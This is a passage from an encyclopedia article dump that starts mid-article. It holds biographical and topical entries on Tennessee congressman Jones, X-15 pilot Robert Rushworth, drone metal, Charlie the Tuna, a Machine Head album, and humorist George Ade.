He was appointed Commissioner of Agriculture of Tennessee in 1949 by Governor Gordon Browning. He is the youngest person to serve as Commissioner. His education, public role, and business experience provided a foundation for helping to guide farm policy for Tennessee during a time of rapid technological change and the social changes as many people left the rural farms. His challenges included the transition of Tennessee agriculture from small family farms to commercial business operations. He created an Assistant Commissioner position to oversee the administrative operations so that he could focus on strategic issues involving animal health vaccination and inspections, artificial insemination for breeding dairy cattle, establishment of a surplus food distribution program for schools, food safety inspections, and agricultural disaster response.

In 1961 President John F. Kennedy appointed him chairman of the Agricultural Stabilization and Conservation Service state committee for Tennessee. He held that position until his election to Congress in 1969.

==U.S. legislative service==

In March 1969, Jones won the Democratic nomination for a special election to replace Robert &quot;Fats&quot; Everett, Congressman from the 8th District in Northwest Tennessee, who had died in office. The election was unusual in that it was contested not only by the Republicans but also by the American Independent Party of George Wallace, who did well in Northwest Tennessee in the previous year&#x27;s presidential election. The other two candidates almost split the vote evenly in the March 25 contest; Jones won with a substantial plurality and was sworn in as soon as the results were certified. However, he was never again to face an election nearly this close.

Jones was re-elected to a full term with less opposition in 1970. In 1972 his district was merged with the Jackson-based 7th District of fellow Democrat Ray Blanton. The resulting district was, if anything, even more Democratic than his previous district. While it retained Blanton&#x27;s district number, geographically it was more Jones&#x27; district (it became the 8th once again after Tennessee regained a ninth district in the 1980 census). To avoid a primary election, Blanton ran, unsuccessfully, for the United States Senate against Republican Howard Baker. Jones retained his seat easily even as Richard Nixon won 90 of Tennessee&#x27;s 95 counties, including most of his district. He was reelected completely unopposed in 1974.

In 1976, Martin businessman and state representative Larry Bates, an associate of high-profile East Tennessee banker Jake Butcher, ran against Jones in the Democratic primary. This was the first (and as it turned out, only) serious challenge of any sort Jones faced. No other party put up a candidate, meaning that victory in the primary was tantamount to election. Bates had a very conservative record as a state representative, even by Tennessee Democratic standards of the time. He ran well to the right of the moderate Jones and spent a large amount of money by the standards of rural West Tennessee at the time. However, he made no real inroads in Jones&#x27; support and was heavily defeated.

After this, Jones coasted to five more terms (including a completely unopposed run in 1984), choosing not to run for a 10th full term (11th overall) in 1988. The Jackson Sun reported on February 14, 1988: &quot;Jones says he&#x27;s retiring simply because the time has come. He wants to spend more time with his wife, Llew, and with his granddaughter, Meghan.&quot;

Jones co-sponsored over 100 bills that successfully entered into law during his tenure in Congress. Jones was the primary author of five bills that passed into law, all of them on agriculture. Among those bills was the Egg Research and Consumer Information Act of 1974, which lead to the creation of the American Egg Board.

==Legacy==
He served as a member of various agriculture-related boards and committees. Jones continued to operate his farm near Yorkville until shortly before his death on December 11, 1999. He was one of the few members of Congress in the late 20th century who was an active farmer instead of merely listing it as an occupation. In 2011, he was inducted as the 13th member of the Tennessee Agricultural Hall of Fame in recognition of his service to Tennessee.

His congressional papers (1969–1988) are housed in the special collections of the Paul Meek Library at UT Martin. They include 121 linear feet of paper files organized in five series, Correspondence, Legislation, Projects, Committees, and Public Relations. The collection includes over 250 audio tapes for two periods, (1969–72) and (1987–88).

<text>Robert Aitken &quot;Bob&quot; Rushworth (October 9, 1924 – March 18, 1993) was a United States Air Force major general, World War II, Korean War and Vietnam War pilot, mechanical and aeronautical engineer, test pilot and astronaut. He was one of twelve pilots who flew the North American X-15, an experimental spaceplane jointly operated by the Air Force and NASA. He flew 34 of the program&#x27;s 199 flights, more than any other pilot.

On June 27, 1963, he flew the X-15 to an altitude above 50 miles, thereby qualifying as an astronaut according to the United States definition of the boundary of space. However, this altitude did not surpass the Kármán line, the internationally accepted boundary of 100 kilometers (62 miles).

==Biography==

===Early life and education===
Rushworth was born on October 9, 1924, in Madison, Maine, to parents Walter Aitken Rushworth (1892–1949) and Mabel Julia Rushworth (; 1891–1992). He had one older brother, Cornell Cameron Rushworth (1920–1944), who was killed in action during World War II. Rushworth attended Madison Memorial High School, where he was a class president for four years, graduating in 1942. After attending Hebron Academy, a prep school, from which he graduated in June 1943, and joining the United States Army Air Forces, he studied mechanical engineering at the University of Maine, receiving a Bachelor of Engineering degree in 1951. He also received a Bachelor of Science degree in aeronautical engineering from the U.S. Air Force Institute of Technology (AFIT) in 1954. In 1967, he graduated from the National War College in Washington D.C.

===Flight experience and military service===
In September 1944, Rushworth earned his pilot wings and a second lieutenant commission following his aviation cadet training program graduation. His first assignment was with the 12th Combat Cargo Squadron in February 1945, in the China-Burma-India Theater of Operations, where he flew C-47 Skytrain transport combat missions from India throughout the Burma Campaign and C-46 Commandos over the &quot;Hump&quot; in the Himalaya Mountains to Shanghai and Beijing. After five years with the Reserve and Air National Guard, during which he received a bachelor&#x27;s degree from the University of Maine, Rushworth was recalled to active duty in 1951. During Korean War, Rushworth served as a F-80C Shooting Star pilot with the 49th Fighter-Interceptor Squadron at Dow Air Force Base.

Following his graduation from the U.S. Air Force Institute of Technology in 1954, Rushworth stayed at Wright-Patterson Air Force Base in Dayton, Ohio. Among his duties was to serve at the Directorate of Flight and All-Weather Testing. There he specialized in the development and flight testing of experimental automatic flight control systems. He graduated from the Air Force Experimental Flight Test Pilot School (Class 56C) in 1957, flying F-101 Voodoos, F-102 Delta Daggers, F-104 Starfighters, F-105 Thunderchiefs, F-106 Delta Darts and other jet fighters. Rushworth was selected for the X-15 program in 1958. He made his first flight on November 4, 1960. Over the next six years, he made 34 flights in the X-15, the most of any pilot. This included a flight to an altitude of 285,000 feet, made on June 27, 1963. This flight above 50 miles qualified Rushworth for Astronaut Wings, though he would have attained that honor sooner had the USAF Man In Space Soonest project proceeded according to plan.

On a later X-15 flight, he was awarded a Distinguished Flying Cross for successfully landing a North American X-15 after its nose wheel extended while flying at nearly Mach 5. He made his final X-15 flight on July 1, 1966, then returned to regular Air Force duties. He attended F-4 Phantom II Combat Crew Training, went through survival training, and in March 1968 he was sent to Cam Ranh Bay Air Base, Republic of Vietnam, where he was assistant deputy commander for operations with the 12th Tactical Fighter Wing and flew 189 combat missions.

Following his return from Vietnam, from April 1969 to January 1971, he was program director of the AGM-65 Maverick program and in February 1971 became commander of the newly organized 4950th Test Wing, Aeronautical Systems Division, at Wright-Patterson Air Force Base, Ohio. Rushworth then served as inspector general, Air Force Systems Command, Andrews Air Force Base, Maryland, from May 1973 to February 1974. He also served as the commander of the Air Force Flight Test Center at Edwards Air Force Base, California, where his responsibilities included the major test programs, including the F-5, A-10, F-15, YF-16, YF-17 and B-1, and as the commander of the Air Force Test and Evaluation Center at Kirtland Air Force Base, New Mexico.

At the time of his retirement as a major general, he was vice commander, Aeronautical Systems Division, Air Force Systems Command, at Wright-Patterson Air Force Base, Ohio, where he dealt directly with senior deputies and managers and assisted the management of major acquisition programs such as the F-5, A-10, F-15, F-16 and B-1 as well as numerous modernization programs like the B-52 and C-5. He held this position since October 1976.

Rushworth was a fellow of the Society of Experimental Test Pilots (SETP), and in 1975 received the SETP&#x27;s James H. Doolittle Award for &quot;outstanding accomplishment in technical management or engineering achievement in aerospace technology&quot;. Rushworth retired on June 1, 1981.

He was rated a Command Pilot Astronaut and logged over 6,500 flying hours in more than 50 types of aircraft.

===Personal===
Rushworth married Joyce Butler (1925–1980) in June 1947, and they had one daughter, Cheri (born March 29, 1957). He died of a heart attack in Camarillo, California, on March 18, 1993, at the age of 68. He is buried at Forest Hill Cemetery in his hometown Madison, Maine.

<doc id="1065577" wikidata="Q1433387" url="?curid=1065577" title="Drone metal">
<text>Drone metal or drone doom is a style of heavy metal that melds the slow tempos and heaviness of doom metal with the long-duration tones of drone music. Drone metal is sometimes associated with post-metal or experimental metal.

==Characteristics==
Typically, the electric guitar is performed with a large amount of reverb or audio feedback while vocals may or may not be present. Songs often lack beat or rhythm in the traditional sense and are typically very long. The experience of a drone metal performance has been compared by novelist John Wray in &quot;The New York Times&quot; to listening to an Indian raga in the middle of an earthquake. Wray also states, &quot;It&#x27;s hard to imagine any music being heavier or, for that matter, very much slower.&quot; A pioneer band of drone metal called Sunn O))) has indicated a kinship with sound sculpture. Jan Tumlir indicates a &quot;sustained infra-sound rumble of sub-bass—so-called brown noise&quot;.

==History==

===Precursors===
Early guitar-produced drone effects go as far back as the krautrock (for example &quot;Cluster II&quot; by Cluster, 1972) and early noise rock / industrial music era (&quot;Metal Machine Music&quot; by Lou Reed, 1975; &quot;Stahlwerksynfonie&quot; by Die Krupps, 1981).

===1990s===

Drone metal was first established by Earth, a group from Olympia, Washington, formed in 1989 by minimalist musician Dylan Carlson, which has been described as &quot;minimalist post-grunge&quot;. Earth took inspiration from the sludge metal of Melvins and the minimalist music of La Monte Young, Terry Riley and Tony Conrad. Stephen O&#x27;Malley&#x27;s group Burning Witch, formed five years later, also in Seattle, continued in this tradition, incorporating unusual vocals and bursts of audio feedback. The group initially recorded for the prominent powerviolence label Slap-a-Ham. O&#x27;Malley&#x27;s subsequent group, Sunn O))), initially formed as a tribute to Earth, is most responsible for the contemporary prominence of the drone metal style. Godflesh is also a stated influence on many groups. Boris, from Tokyo, also developed a style of drone metal, parallel with the Seattle groups, as did Corrupted, from Osaka.

===2000s===
Nadja (Toronto), Locrian (US), Jesu (UK), Black Boned Angel (Wellington, New Zealand), Khanate (New York City), Ocean (Portland, Maine), Growing (New York City), KTL (Washington/London), Ascend and Eagle Twin (US), Teeth of Lions Rule the Divine (Nottingham, England), Conan (Liverpool, England) and Moss (Southampton, England) are prominent drone metal groups that formed in the early 21st century. Noise musicians, such as Kevin Drumm and Oren Ambarchi, have also worked in the style. Rhys Chatham&#x27;s Essentialist project is a contribution to drone metal by an elder composer, attempting to &quot;arrive at an &quot;a priori&quot; essence of heavy metal, reducing it to a basic chord progression&quot;.

==Connections with other art forms==
Stephen O&#x27;Malley from Sunn O))) collaborated on an installation with artist Banks Violette, who has likened drone metal to the work of Donald Judd. Tumlir locates a precedent in Robert Rauschenberg. Violette points out, however, that drone metal is &quot;as much a physiological phenomenon as an acoustic one&quot;, with an attendant physicality. O&#x27;Malley has also mentioned an appreciation for Cormac McCarthy and Richard Serra. Rhys Chatham&#x27;s Essentialist included projections by Robert Longo. Jim Jarmusch&#x27;s 2009 film &quot;The Limits of Control&quot; features music by a number of drone metal groups. Jarmusch said, &quot;I love these kind of visual landscapes they make, and they really inspired things for me for my film ..., because when I write I&#x27;m listening to things that inspire me in the direction of whatever world I&#x27;m imagining. Boris and Sunn O))) and Earth were really instrumental in me just finding a place in my head.&quot;

<doc id="1065579" wikidata="Q5085756" url="?curid=1065579" title="Charlie the Tuna">
<text>Charlie the Tuna is the cartoon mascot and spokes-tuna for the StarKist brand. He was created in 1961 by Tom Rogers of the Leo Burnett Agency. StarKist Tuna is owned by Dongwon Industries, a South Koreabased conglomerate. Charlie is one of the most recognized characters in American advertising.

==History==
===Creation===
Charlie the Tuna was based on Tom Rogers&#x27; friend Henry Nemo. Nemo is known as the &quot;creator of jive&quot;, which resembles the loose-lipped slang used by Charlie the Tuna.

===Campaign===
The advertisements depicted Charlie (voiced by actor Herschel Bernardi) as a hipster, originally a lower class New York accented beatnik wearing a beret and thick glasses who believes that his hip, cultured &quot;good taste&quot; make him a perfect catch for StarKist, but he is always rejected. Announcer Danny Dark explains to him &quot;Sorry, Charlie!&quot; Some advertisements ended with Charlie encouraging viewers to &quot;Tell &#x27;em, Charlie sent you&quot;. Earlier advertisements would have some other form of sea life saying &quot;But Charlie, StarKist does not want tunas with good taste; they want tunas that taste good.&quot; These commercials were animated by DePatie–Freleng Enterprises. &quot;Sorry, Charlie&quot; became a popular American catchphrase.

The Charlie character appeared in more than 85 advertisements for StarKist until the 1980s, when the campaign was retired. Herschel Bernardi, the original voice of the character, died on May 9, 1986. Charlie made a comeback in 1999, when StarKist revived him to introduce a new line of tuna products marketed as healthy. He has been the mascot of the company since then and is one of the most-recognized brand mascots in American advertising.

Dark died on June 13, 2004, while Rogers died on June 24, 2005.

==Legacy==

Los Angeles radio personality and voiceover artist Charlie Tuna (real name: Art Ferguson) chose his on-air name early in his career upon the departure of another Oklahoma City disc jockey. All disc jockeys at KOMA were told to draw their on-air names out of a hat, and by the time Chuck Riley picked his on-air name out of a hat, every name had been drawn except for &quot;Charlie Tuna&quot;. Riley used the name for a week, and then left. His replacement, Art Ferguson, inherited the name, and he would keep the Charlie Tuna name upon relocating first to Boston and then Los Angeles.

American football head coach Bill Parcells earned the nickname &quot;The Big Tuna&quot; when he responded to an obviously false statement from a player with the incredulous &quot;Who do you think I am? Charlie the Tuna?&quot;

American hip-hop star Chali 2na chose his rap name by slightly modifying the name Charlie Tuna, a nickname his uncle gave him in his youth.

During the production of the 2017 film &quot;The Shape of Water&quot;, director Guillermo del Toro remarked of the creature in the film: &quot;[The] character is called &#x27;Charlie&#x27; on the call-sheet by reference to the StarKist mascot Charlie the Tuna. &#x27;We wanted to play the ad on TV&#x27;, he says, &#x27;but StarKist didn&#x27;t want to have anything to do with a movie like this. The nickname stayed.

Charlie the Tuna makes a cameo appearance in the 2012 animated film &quot;Foodfight!&quot; and is also featured on the North American home video cover art of it.

Charlie the Tuna was shown in MasterCard&#x27;s 2005 &quot;Icons&quot; commercial which was shown during Super Bowl XXXIX, and depicts many famous advertising mascots having dinner together.

<text>Through the Ashes of Empires is the fifth studio album by American heavy metal band Machine Head. On this album, the band returned to their groove/thrash metal sound that was featured on their debut album &quot;Burn My Eyes&quot; (1994) and their second album &quot;The More Things Change...&quot; (1997) after experimenting with the nu metal genre featured on their previous two albums. It was released in the UK, Europe and Australia on the Roadrunner Records International label on October 27, 2003. At this stage, Machine Head still did not have an American record deal, having parted ways with Roadrunner Records US after the &quot;Supercharger&quot; album was released. &quot;Through The Ashes of Empires&quot; was such a success that Roadrunner Records US, in an unprecedented move, quickly offered Machine Head a new contract and the album finally reached North America on April 20, 2004. This album was also the first album to feature guitarist Phil Demmel, who would stay with the band until his departure in 2018.

On December 9, 2011, the album was certified Silver by the British Phonographic Industry and it has sold just under 80,000 copies in the UK.

==Background==
Because guitarist Ahrue Luster had left the band due to creative differences, the album was written by the remaining three band members, with then-temporary guitarist Phil Demmel only joining in for the recording sessions. When asked about the writing process for the album, vocalist and guitarist Robb Flynn said:
:&quot;...when Ahrue quit MH to go join Nickelback wannabes Juggernaut, we made a decision to start writing as a three-piece. We didn&#x27;t want to go through the whole &#x27;try out&#x27; process, and see if some new guy would fit.&quot;

A special edition of the album was also released, containing a second disc with early demo recordings of songs from the album, as well as a short video of Machine Head in the studio during the recording of the album. The band discusses the gear used to record it, as well as various issues relating to it.

Machine Head recorded the album from June 16 to July 21, 2003. The band then travelled to England to mix the album with Colin Richardson at the start of August. The album&#x27;s was supposed to be mastered on August 15; as mixing took longer than expected, it was instead mastered on August 31, 2003.

The band recorded an additional song, &quot;Seasons Wither&quot;, for the North American release of the album as a measure of compensation for the American fans for having to wait so long; it was subsequently released internationally as a B-side on the &quot;Days Turn Blue to Gray&quot; single. According to guitarist Demmel, the song also gives an indication of the direction the band would take with their next album, &quot;The Blackening&quot;.

In 2013, Robb Flynn released a demo for the unused track &quot;Pins and Needles&quot;, which the band rejected for being &quot;one of the worst songs [Flynn has] ever written when it comes to [his] vocals and vocal ideas&quot;. Despite the group&#x27;s negativity towards the demo, it would later be rewritten to become the Roadrunner United track &quot;Army of the Sun&quot; with Tim Williams from Vision of Disorder on vocals.

The album can be considered an encapsulation of the band at that point, stylistically concompassing all four of their previous works. It has the melodicism of &quot;The Burning Red&quot; and &quot;Supercharger&quot;, the darker, heavier groove of &quot;The More Things Change&quot; and the sheer aggression of &quot;Burn My Eyes&quot;. Lyrically, the album is rooted in stories of personal struggles, triumphs, morbidity, and abuse.

The album has since proven to be a success with critics, music charts and fans. The album has been well-embraced as an excellent return to form both musically and lyrically. The difficult circumstances under which the album was recorded was documented on their concert DVD &quot;Elegies&quot;.

==Critical reception==
The album received positive reviews and was a commercial success, In 2005, &quot;Through the Ashes of Empires&quot; was ranked number 311 in &quot;Rock Hard&quot; magazine&#x27;s book of &quot;The 500 Greatest Rock &amp; Metal Albums of All Time&quot;.

==Track listing==

&quot;Seasons Wither&quot; did not appear on the original worldwide release, but was added to the US release to make up for the delayed release; in this edition, the song appears between &quot;Vim&quot; and &quot;All Falls Down&quot;.
==Personnel==
*Robb Flynn – lead vocals, rhythm guitar, guitar solo on &quot;Left Unfinished&quot;, second guitar solo on &quot;Vim&quot;
*Adam Duce – bass, backing vocals
*Phil Demmel – lead guitar
*Dave McClain – drums

<doc id="1065581" wikidata="Q1506837" url="?curid=1065581" title="George Ade">
<text>George Ade (February 9, 1866 – May 16, 1944) was an American writer, syndicated newspaper columnist, librettist, and playwright who gained national notoriety at the turn of the 20th century with his &quot;Stories of the Streets and of the Town&quot;, a column that used street language and slang to describe daily life in Chicago, and a column of his fables in slang, which were humorous stories that featured vernacular speech and the liberal use of capitalization in his characters&#x27; dialog.

Ade&#x27;s fables in slang gained him wealth and fame as an American humorist, as well as earning him the nickname of the &quot;Aesop of Indiana&quot;. His notable early books include &quot;Artie&quot; (1896); &quot;Pink Marsh&quot; (1897); &quot;Fables in Slang&quot; (1900), the first in a series of books; and &quot;In Babel&quot; (1903), a collection of his short stories. His first stage work produced for the Broadway stage was the operetta &quot;The Sultan of Sulu&quot;, for which he wrote the libretto in 1901. &quot;The Sho-Gun&quot; and his best-known plays, &quot;The County Chairman&quot; and &quot;The College Widow&quot;, were simultaneously appearing on Broadway in 1904. Ade also wrote scripts and had some of his fables and plays adapted into motion pictures.

During the first quarter of the 20th century, Ade, along with Booth Tarkington, Meredith Nicholson, and James Whitcomb Riley helped to create a Golden Age of literature in Indiana.

The Purdue University graduate from rural Newton County, Indiana, began his career in journalism as a newspaper reporter in Lafayette, Indiana, before moving to Chicago, Illinois, to work for the &quot;Chicago Daily News&quot;. In addition to writing, Ade enjoyed traveling, golf, and entertaining at Hazelden, his estate home near Brook, Indiana. Ade was also a member of Purdue University&#x27;s board of trustees from 1909 to 1916, a longtime member of the Purdue Alumni Association, a supporter of Sigma Chi (his college fraternity), and a former president of the Mark Twain Association of America. In addition, he donated funds for construction of Purdue&#x27;s Memorial Gymnasium, its Memorial Union Building, and with David Edward Ross, contributed land and funding for construction of Purdue&#x27;s Ross–Ade Stadium, named in their honor in 1924.

==Early life and education==
George Ade was born in Kentland, Indiana, on February 9, 1866, to farmer and bank cashier John and Adaline Wardell (Bush) Ade. George was the second youngest of the family&#x27;s seven children (four boys and three girls). George&#x27;s father served as the Newton County, Indiana, recorder, and was also a banker in Kentland; his mother was a homemaker. George enjoyed reading from an early age, but he disliked manual labor and was not interested in becoming a farmer. Although he graduated from Kentland High School in 1881, his mother did not think he was ready for college. As a result, Ade remained in high school for another year before enrolling at Purdue University in 1883 on scholarship.

Ade studied science at Purdue, but his grades began to falter after his first year when he became more active in the college&#x27;s social life. Ade also developed an interest in the theater and became a regular at the Grand Opera House in Lafayette, Indiana. In addition, he joined the Sigma Chi fraternity. Ade also met and began a lifelong friendship with cartoonist and Sigma Chi fraternity brother John T. McCutcheon. Ade graduated with a Bachelor of Science degree from Purdue in 1887. He briefly thought about becoming a lawyer, but abandoned the idea to pursue a career in journalism.

==Career==
===Newspaper reporter===
Ade did not begin his writing career in college. In 1887, after graduating from Purdue University, he worked in Lafayette, Indiana, as a reporter and telegraph editor for the &quot;Lafayette Morning News&quot; and then the &quot;Lafayette Call&quot;. After the newspaper discontinued publication, Ade earned a meager paycheck writing testimonials for a patent-medicine company. By 1890 he had moved to Chicago, Illinois, and resumed his career as a newspaper reporter, joining John T. McCutcheon, his college friend and Sigma Chi fraternity brother, at the &quot;Chicago Daily News&quot; (which later became the &quot;Chicago Morning News&quot; and the &quot;Chicago Record&quot;), where McCutcheon worked as an illustrator.

Ade&#x27;s first assignment was writing a daily weather story for the &quot;Morning News&quot;. He also covered some major news events, including the explosion of the steamer &quot;Tioga&quot; on the Chicago River; the heavyweight championship boxing match between John L. Sullivan and James J. Corbett in New Orleans, Louisiana, in 1892, Corbett–Sullivan fight – 1892; and the World&#x27;s Columbian Exposition (Chicago World&#x27;s Fair) in 1893.

===Syndicated columnist===
While working for the &quot;Chicago Record&quot;, Ade developed his talent for turning local human-interest stories into humorous satire, which became his trademark. Beginning in 1893, Ade was put in charge of the daily column, &quot;Stories of the Streets and of the Town,&quot; which frequently included McCutcheon&#x27;s illustrations. Through Ade&#x27;s use of street language and slang, the column described daily life in Chicago and introduced some of his early literary characters, which included Artie, an office boy; Doc Horne, a &quot;gentlemanly liar&quot;; and Pink Marsh, an African American shoeshine boy who worked in a barbershop. Collections of Ade&#x27;s columns were subsequently published as books, such as &quot;Artie&quot; (1896), &quot;Pink Marsh&quot; (1897), and &quot;Doc&#x27; Horne&quot; (1899), which also helped to increase the popularity of his column. Ade&#x27;s newspaper columns also included dialog and short plays containing his humorous observations of everyday life.

Ade first introduced his fables in slang in the &quot;Chicago Record&quot; in 1897. &quot;The Fable of Sister Mae, Who Did As Well As Could Be Expected&quot; appeared on September 17, 1897; the second one, &quot;A Fable in Slang,&quot; appeared a year later; others followed in a weekly column. These humorous stories, complete with morals, featured vernacular speech and Ade&#x27;s idiosyncratic capitalization of the characters&#x27; dialog. Ade left the &quot;Chicago Record&quot; in 1899 to work on nationallysyndicated newspaper column of his fables in slang. &quot;Fables in Slang&quot; (1900), the first in a series of book of Ade&#x27;s fables, was popular with the public and for nearly twenty years more collections of his fables were compiled into additional books, ending with &quot;Hand-Made Fables&quot; (1920). Ade&#x27;s fables also appeared in periodicals, the Essanay Film Manufacturing Company produced them as motion-picture shorts, and Art Helfant also turned them into comic strips.

===Playwright, librettist, and author===
After Ade&#x27;s newspaper columns went into syndication in 1900, he began writing plays. His first stage work produced for Broadway was the musical &quot;The Night of the Fourth&quot; which premiered on January 21, 1901 at the Victoria Theatre. Ade wrote the book to this musical with Max Hoffmann as composer and J. Sherrie Mathews as lyricist. It was a critical flop and closed after fourteen performances.

Ade&#x27;s next show on Broadway was &quot;The Sultan of Sulu&quot;; an operetta with music by Alfred G. Wathall for which Ade was the librettist. The opera&#x27;s plot was about the American military&#x27;s efforts to assimilate natives of the Philippines into American culture. It premiered at Wallack&#x27;s Theatre on December 29, 1902 in a production produced by opera impresario Henry W. Savage. A popular success, it ran for 200 performances at that theatre; closing on Jun 13, 1903. It then embarked on a national tour which included a return engagement to Broadway in November 1903, this time at the Grand Opera House. The composer Nathaniel D. Mann contributed one song to the operetta, &quot;My Sulu Lulu Loo&quot;.

His other works for Broadway include &quot;Peggy from Paris&quot; (1903), a musical comedy; &quot;The County Chairman&quot; (1903), a piece about small-town politics; &quot;The Sho-Gun&quot; (1904), a musical set in Korea; and &quot;The College Widow&quot; (1904), a comedy about college life and American collegiate football.

Not all of Ade&#x27;s theatrical productions were successes, such as &quot;The Bad Samaritan&quot; (1905), but three of his plays (&quot;The College Widow&quot;, &quot;The Sho-Gun&quot;, and &quot;The County Chairman&quot;) were simultaneously appearing on Broadway in 1904. The best known and among the most successful of Ade&#x27;s Broadway plays are &quot;The County Chairman&quot; and &quot;The College Widow&quot;, which were also adapted into motion pictures. Ade&#x27;s final Broadway play before he retired from playwriting was &quot;The Old Town&quot;, produced in 1910.

After Ade retired from writing Broadway plays in 1910, he continued to write one-act plays that small theater companies presented in theatres across the United States. &quot;Marse Covington&quot; is considered to be among the best of his one-act plays. Ade also wrote scripts for moving pictures, such as &quot;Our Leading Citizen&quot; (1922 silent film), &quot;Back Home and Broke&quot; (1922 silent film), and &quot;Woman-Proof&quot; (1923 silent film) for actor Thomas Meighan. Ade also wrote two films for Will Rogers, &quot;U.S. Minister Bedlow&quot; (adapted from his 1911 play of the same name) and &quot;The County Chairman&quot;, a 1935-screen version of the play, but Ade did not get along with Hollywood filmmakers.

By the mid-1920s, Ade&#x27;s plays were no longer in fashion, but he continued to write essays, short stories, and articles for newspapers and magazines in addition to film scripts. Ade also wrote about his extensive travels, but he is best known for his humorous columns, essays, books, and plays. His fables in slang stories and series of books, in addition to making him wealthy, gained him notoriety as an American writer. His final book, &quot;The Old-Time Saloon&quot;, was published in 1931.

==Writing style==
Ade&#x27;s literary reputation rests upon his achievements as a humorist of American character. When the United States began a population shift as the first large wave of migration from rural communities to urban cities and the country transitioned from an agrarian to an industrial economy, Ade used his wit and keen observational skills to record in his writings the efforts of ordinary people to get along and to cope with these changes. Because Ade grew up in a Midwestern farming community and also knew about urban living in cities like Chicago, he could develop stories and dialog that realistically captured daily life in either of these settings. His fictional men and women typically represented the common, undistinguished, average Americans, who were often &quot;suspicious of poets, saints, reformers, eccentricity, snobbishness, and affectation,&quot; as well as newcomers.

While his humor depicts Midwestern speech and manners, it also reflects mannerisms found in late 19th-century America as well. Like Ade himself, his characters also found humor in everyday experiences, mocked pretentious social situations, and tried not take life too seriously. Using a writing style similar to Mark Twain&#x27;s, Ade was adept in the use of the American language. Ade&#x27;s fables in slang,&quot; for example, were written in the American colloquial vernacular. He also offered genial satire and provided &quot;a social record of how ridiculous some people make themselves.&quot;

Striking features of Ade&#x27;s essays and fables in slang are his creative figures of speech and liberal use of capitalization. An example of Ade&#x27;s non-standard punctuation and writing style appears in this description of a modern single woman and what Ade believes to be her high standards for an ideal husband: 

In 1915, Sir Walter Raleigh, Oxford professor and man of letters, while on a lecture tour in America, called George Ade &quot;the greatest living American writer.&quot; H. L. Mencken considered selections that appeared in Ade&#x27;s book, &quot;In Babel,&quot; as &quot;some of the best short stories in America.&quot;

==Personal life==
===Hazelden farm===

By the early 1900s, after twelve years in Chicago, Ade&#x27;s writing had brought him financial success and he retired to a leisurely life in the country. Ade invested his earnings in Newton County, Indiana, farmland, eventually owning about . In 1902, George&#x27;s brother, William Ade, purchased on his behalf a site of wooded land along the Iroquois River near the town of Brook in Newton County, Indiana. George initially intended to build a summer cottage. Instead, Chicago architect Billie Mann, a Sigma Chi fraternity brother, designed for Ade a two-story, fourteen-room country manor, which was constructed at an estimated cost of US$25,000. Ade named the property Hazelden, after his English grandparents&#x27; home, and moved from Chicago into the newly built residence in 1904. In addition to the Tudor Revival-style home, the property eventually included landscaped grounds, a swimming pool, greenhouse, barn, and caretaker&#x27;s cottage, among other outbuildings. Ade also added an adjacent golf course and country club in 1910.

Ade frequently entertained at his Indiana estate. In addition to serving as a summer home (and his permanent residence beginning in 1905), Hazelden was used for political gatherings and community events. Hazelden was the site where Republican William Howard Taft announced his candidacy for president of the United States and launched his campaign in 1908. It was also used as the site for a political rally for Theodore Roosevelt&#x27;s Bull Moose Party in 1912 and a venue for an address from vice presidential candidate Charles W. Dawes in 1924. (Ade, a political conservative, supported Republican Party candidates.) Ade also hosted a homecoming party for soldiers and sailors on July 4, 1919, as well as parties and gatherings for the community, local children, Purdue University alumni, Sigma Chi fraternity brothers, members of the Indiana Society of Chicago, and golf tournaments.

===Other interests===
Ade spent the summer months at his Hazelden estate in Newton County, Indiana, and vacationed during the winter months at a rented home in Miami, Florida. He was also an avid traveler who made trips around the world, as well as multiple trips to Europe, the West Indies, China, and Japan. In addition to his frequent travels, Ade enjoyed horse racing and golf.

Ade, who never married, corresponded regularly with a wide circle of friends and was active in literary, civic, and political organizations. In 1905 he was a cofounder with Edward M. Holloway and John T. McCutcheon of the Indiana Society of Chicago, a literary organization. Ade also served as a delegate to the Republican National Convention in Chicago in 1908.

Ade was a longtime supporter of Purdue University and Sigma Chi,his college fraternity. He served as national president of Sigma Chi in his later years and as a member of Purdue&#x27;s board of trustees from 1909 to 1916. Ade was also a member of the Purdue Alumni Association. Ade donated funds for construction of Purdue&#x27;s Memorial Gymnasium and its Memorial Union Building. In 1922, Ade and David Edward Ross, another Purdue alumni, bought of land for use as the site of a new football stadium at Purdue&#x27;s campus in West Lafayette, Indiana. In addition, Ade and Ross provided financial support construction of the facility, which was formally dedicated on November 22, 1924, and named Ross–Ade Stadium in their honor. Ade also led a fund-raising campaign to endow the Sigma Chi mother house at Miami University, where the fraternity was originally established. Ade also authored the &quot;Sigma Chi Creed&quot; in 1929, which is one of the central documents of the fraternity&#x27;s philosophies.

In his later years Ade was a member of National Institute of Arts and Letters (American Academy of Arts and Letters) and an executive committee member of the Authors Guild. Purdue University awarded Ade an honorary degree in the humanities in 1926 and Indiana University awarded him an honorary law degree in 1927. During the early 1940s, he also served as president of the Mark Twain Association of America. Ade&#x27;s activities slowed after he suffered a stroke in June 1943 that left him partially paralyzed and a series of heart attacks in 1944.

==Death and legacy==
Ade fell into a coma after suffering a heart attack and died on May 16, 1944 in Brook, Indiana at the age of 78. His remains are interred at Fairlawn Cemetery in Kentland, in Iroquois Township, Newton County, Indiana.

Ade is considered a humorist, satirist, and a moralist with keen observational skills, as well as and &quot;one of the greatest writers of his time.&quot; Ade&#x27;s writings reached the height of their popularity in the 1910s and 1920s. Along with the works of other Hoosier writers, such as James Whitcomb Riley, Booth Tarkington, and Meredith Nicholson, among others, Ade&#x27;s writing was part of the Golden Age of Indiana Literature of the late nineteenth and early twentieth centuries. His fables in slang gained him wealth and fame as an American humorist, in addition to earning him the nickname of the &quot;Aesop of Indiana.&quot; In more recent decades, his works have been largely forgotten.

The better known of his plays that were produced on Broadway are &quot;The County Chairman&quot; and &quot;The College Widow&quot;, which were also adapted into motion pictures. While the presentations of his plays and musical comedies increased his wealth and international renown, Ade&#x27;s legacy includes numerous newspaper columns, magazine articles, essays, and books that describe his perspective on American life in the late nineteenth and early decades of the twentieth century.

